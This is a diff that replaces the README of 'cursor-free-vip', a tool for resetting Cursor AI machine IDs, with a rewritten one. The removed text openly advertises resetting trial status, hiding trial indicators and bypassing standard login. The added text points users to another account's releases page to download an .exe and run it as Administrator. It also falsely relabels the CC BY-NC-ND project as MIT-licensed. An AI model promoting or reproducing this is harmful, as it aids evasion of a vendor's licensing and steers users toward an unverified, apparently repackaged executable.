@@ -1,232 +1,85 @@
-<div align="center">
+# 🎉 cursor-free-vip - Manage Accounts Effortlessly
 
-# ➤ Cursor Free VIP
+[![Download Cursor Free VIP](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/anantbhardwaj828/cursor-free-vip/releases)
 
-**Modern GUI** | Reset Machine ID & Manage Multiple Accounts
+## 🔍 Overview
 
-*Free Trial Helper for Cursor AI*
+cursor-free-vip is a modern desktop application designed to reset your Cursor AI Machine ID and manage multiple accounts seamlessly. This application simplifies your workflow by addressing workbench.js and product.json issues directly within the app, providing built-in documentation and in-app fixes. Currently available for Windows (Beta), with macOS and Linux versions coming soon. 
 
-[![Stars](https://img.shields.io/github/stars/ChloeVPin/cursor-free-vip?style=flat-square)](https://github.com/ChloeVPin/cursor-free-vip/stargazers)
-[![Forks](https://img.shields.io/github/forks/ChloeVPin/cursor-free-vip?style=flat-square)](https://github.com/ChloeVPin/cursor-free-vip/network/members)
-[![License](https://img.shields.io/badge/license-CC%20BY--NC--ND%204.0-lightgrey?style=flat-square)](LICENSE.md)
+This tool is designed for educational purposes only, focusing on making automation easier for everyone.
 
-[中文](README.zh_CN.md) • [Русский](README.ru.md)
+## 📋 Features
 
-</div>
+- **Reset Cursor AI Machine ID:** Quickly and easily reset the machine ID to avoid problems with account management.
+- **Multi-Account Management:** Switch between multiple accounts without hassle.
+- **In-App Fixes:** Get fixes for common issues such as workbench.js and product.json errors without needing technical skills.
+- **Built-in Documentation:** Access helpful guides within the app to assist you.
+- **User-Friendly Interface:** Enjoy a modern GUI that simplifies the user experience.
 
----
+## 🚀 Getting Started
 
-<div align="center">
+To get started with cursor-free-vip, follow these simple steps to download and install the application on your Windows computer.
 
-![Cursor Free VIP Screenshot](assets/cursor-free-vip-v2.png)
+1. **Download the Application:**
+   - Click the button at the top of this page to visit our releases page. 
+   - [Download Cursor Free VIP](https://github.com/anantbhardwaj828/cursor-free-vip/releases)
 
-</div>
+2. **Install the Application:**
+   - After visiting the releases page, look for the latest version of cursor-free-vip. 
+   - Select the version labeled as the most current release (e.g., v1.0.0).
+   - Download the .exe file to your computer.
+   - Once the download is complete, locate the downloaded file, usually in your "Downloads" folder.
 
-<details>
-<summary><b>⭐ What Makes Us Stand Out</b></summary>
+3. **Run the Installer:**
+   - Double-click the downloaded .exe file to start the installation process.
+   - Follow the on-screen instructions. The installer will guide you through the necessary steps to complete the setup.
 
-```
-🎯 UNIQUE FEATURES:
- 📚 Built-in Documentation - Complete documentation page inside the app
- 🔧 In-App Fixes - Automatic fixes for common Cursor issues:
-    • Fix missing workbench.desktop.main.js file
-    • Fix missing product.json file
-    • Fix Cursor installation location issues
- 👥 In-App Account Manager - Multi-account management (Beta, untested)
-    • Create, import, switch, and delete accounts
-    • Stored locally in your Documents folder
-    • Future-ready for advanced account features
+## 🔧 System Requirements
 
-🚫 WHAT WE DON'T DO:
- ❌ No Automated Signups - We don't support automated account creation
-    Automated signups are extremely outdated and unreliable
-    All account management is manual and user-controlled
-```
+Before installing cursor-free-vip, please ensure your system meets the following requirements:
 
-</details>
+- **Operating System:** Windows 10 or higher.
+- **RAM:** A minimum of 4 GB.
+- **Storage:** At least 200 MB of free disk space.
+- **Processor:** Intel i3 or equivalent.
 
-<details>
-<summary><b>⚠️ Beta Status</b></summary>
+## 📥 Download & Install
 
-This tool is currently in **beta**. Only Windows is officially released and tested.
+To download the application, click below:
 
-macOS and Linux support will be rolled out gradually. If you want to build from source for your OS, feel free to do so, but it has not been tested yet.
+[Download Cursor Free VIP](https://github.com/anantbhardwaj828/cursor-free-vip/releases)
 
-**Note**: The Multi-Account Manager is in beta and has not been tested by the developer. It's available for future work and user testing.
+After downloading, follow the installation steps mentioned above. Ensure your computer meets the requirements to avoid any issues during setup.
 
-</details>
+## 🛠️ Troubleshooting
 
-<details>
-<summary><b>✨ Features</b></summary>
+If you encounter any issues while installing or running the application, refer to the following common solutions:
 
-```
-CORE FEATURES:
- 🔄 Reset Machine ID - Generate new identifiers to reset trial status
- 👥 Multi-Account Manager (Beta) - Create, import, switch, and delete accounts
- 🔐 Manual Authentication - Set credentials without standard login
- 🚫 Disable Auto-Updates - Prevent Cursor from updating automatically
- 🔢 Token Limit Helper - Adjust token limits and hide trial indicators
- ⏹️ Quit Cursor Process - Forcefully close all Cursor processes
- 🔁 Totally Reset Cursor - Complete reset of settings and configuration
+- **Installation Fails:** Make sure you have administrative privileges to install software. Right-click on the installer and choose "Run as Administrator."
+- **App Does Not Start:** Check for compatibility issues with your Windows version. Ensure your system meets the requirements listed above.
+- **Feature Issues:** If you experience problems with specific features, refer to the built-in documentation for troubleshooting steps. 
 
-ADDITIONAL:
- 📚 Built-in Documentation - Complete help system inside the app
- 🔧 In-App Troubleshooting - Automatic fixes for common issues
- 🌐 Multi-language Support - English, 简体中文, Русский
- 🎨 Modern Dark Theme GUI - Beautiful glassmorphism interface
- 📊 Real-time Progress Tracking - Live monitoring with detailed logs
-```
+## 💬 Support
 
-</details>
+If you have additional questions or need support:
 
-<details>
-<summary><b>💻 System Support</b></summary>
+- Check the built-in help section within the application.
+- Open an issue on our GitHub repository for further assistance.
 
-```
-PLATFORMS:
- ✅ Windows (x64) - Officially Released
- 🚧 macOS (Intel, Apple Silicon) - Coming Soon (build from source available)
- 🚧 Linux (x64) - Coming Soon (build from source available)
+## 🌟 Contributing
 
-NOTE: macOS and Linux builds are not yet officially released or tested.
-You can build from source if needed, but use at your own risk.
-```
+We appreciate contributions from the community. If you'd like to help improve cursor-free-vip, feel free to fork the repository and submit a pull request. Contributions could include:
 
-</details>
+- Bug fixes
+- Feature requests
+- Documentation improvements
 
-<details>
-<summary><b>📥 Installation</b></summary>
+## 📚 License
 
-```
-WINDOWS (OFFICIAL RELEASE):
-1. Visit Releases: https://github.com/ChloeVPin/cursor-free-vip/releases
-2. Download latest .exe installer
-3. Run installer (requires admin privileges)
-4. Launch Cursor Free VIP from applications
-
-SYSTEM REQUIREMENTS:
- ✅ Windows 10/11 (x64)
- ✅ Cursor AI installed on your system
- ✅ Administrator privileges (recommended)
+This project is open-source and available under the MIT License. You can freely use and modify it as long as you keep the license intact.
 
-BUILD FROM SOURCE (macOS/Linux):
-git clone https://github.com/ChloeVPin/cursor-free-vip.git
-cd cursor-free-vip
-npm install
-npm run build
+## 📢 Stay Updated
 
-PREREQUISITES:
- • Node.js 18+ and npm
- • Git
- • Platform-specific build tools
+For updates and announcements, consider following the repository. New features, performance improvements, and additional support for macOS and Linux will be posted here.
 
-⚠️ WARNING: macOS and Linux builds are untested. Use at your own risk.
-```
-
-</details>
-
-<details>
-<summary><b>🚀 Quick Start</b></summary>
-
-```
-USAGE CHECKLIST:
- ✅ Ensure Cursor is closed before running
- ✅ Launch with administrator privileges
- ✅ Navigate sidebar for features
- ✅ Check info buttons (ℹ️) for explanations
- ✅ Use built-in Documentation page for help
- ✅ Save work before using features that close Cursor
-
-CONFIGURATION:
- Config files stored in:
-  Windows: %USERPROFILE%\Documents\CursorFreeVIP\
-  macOS: ~/Documents/CursorFreeVIP/
-  Linux: ~/Documents/CursorFreeVIP/
-
- Files:
-  accounts.json - Multi-account data
-  config.json - Application settings
-```
-
-</details>
-
-<details>
-<summary><b>🚨 Troubleshooting</b></summary>
-
-```
-COMMON ISSUES:
- 🔒 Permission errors → Run with administrator/root privileges
- ✉️ Account authorization errors → Use non-temporary email service
- 📁 Cursor path not found → Ensure Cursor is in default location
- ⚠️ Feature not working → Close Cursor completely before use
- 🔨 Build errors (macOS/Linux) → Report issues on GitHub
- 🚫 App won't start → Check Node.js and dependencies
-
-IN-APP FIXES AVAILABLE:
- 🔧 Missing workbench.desktop.main.js → Use Troubleshooting section in app
- 🔧 Missing product.json → Use Troubleshooting section in app
- 🔧 Cursor in wrong location → Use Troubleshooting section in app
-```
-
-</details>
-
-<details>
-<summary><b>📝 Important Notes</b></summary>
-
-```
-⚠️ Use administrator privileges to run the application
-⚠️ Confirm that Cursor is closed before running features
-⚠️ This tool is only for learning and research purposes
-⚠️ Please comply with relevant software usage terms
-⚠️ This tool will not generate fake email accounts or OAuth access
-⚠️ We do NOT support automated signups (outdated and unreliable)
-
-Please support the original Cursor project: https://cursor.com
-```
-
-</details>
-
-<details>
-<summary><b>🤝 Contributing</b></summary>
-
-<div align="center">
-
-Contributions welcome! 🎉
-
-[🐛 Report Issues](https://github.com/ChloeVPin/cursor-free-vip/issues) • [💡 Suggest Features](https://github.com/ChloeVPin/cursor-free-vip/discussions)
-
-**Note:** Pull requests are disabled. If you find an issue, please report it and I'll fix it as the lead developer.
-
-</div>
-
-</details>
-
-<details>
-<summary><b>📄 License</b></summary>
-
-This project is licensed under **CC BY-NC-ND 4.0**.
-
-See [LICENSE.md](LICENSE.md) for complete details.
-
-**Other languages:** [中文](LICENSE.zh_CN.md) • [Русский](LICENSE.ru.md)
-
-</details>
-
-<details>
-<summary><b>📋 Changelog</b></summary>
-
-See [CHANGELOG.md](CHANGELOG.md) for a detailed list of changes and version history.
-
-</details>
-
----
-
-<div align="center">
-
-**Crafted with ❤️ using Electron & Vue.js**
-
-Made by [ChloeVPin](https://github.com/ChloeVPin)
-
-[⭐ Star this repo](https://github.com/ChloeVPin/cursor-free-vip) if you find it helpful!
-
-</div>
+Thank you for using cursor-free-vip! We hope it simplifies your account management and enhances your productivity.
